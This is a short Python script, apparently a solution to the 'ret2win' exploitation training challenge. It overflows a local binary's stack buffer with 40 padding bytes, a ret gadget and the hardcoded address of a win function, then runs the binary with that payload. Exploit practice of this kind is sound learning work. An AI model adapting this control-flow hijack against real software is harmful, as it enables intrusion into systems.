import subprocess
from pwn import p64

bin = "./ret2win"

# insert the address of ret2win
addr = 0x0000000000400756
prepd_addr = p64(addr)

# address of ret instruction to align the stack
ret_addr = 0x00000000004006e7
prepd_ret = p64(ret_addr)

payload = b"A" * 40 + prepd_ret + prepd_addr

result = subprocess.run(
    [bin],
    input=payload,
    text=False,
    capture_output=True
)

print(result.stdout.decode())
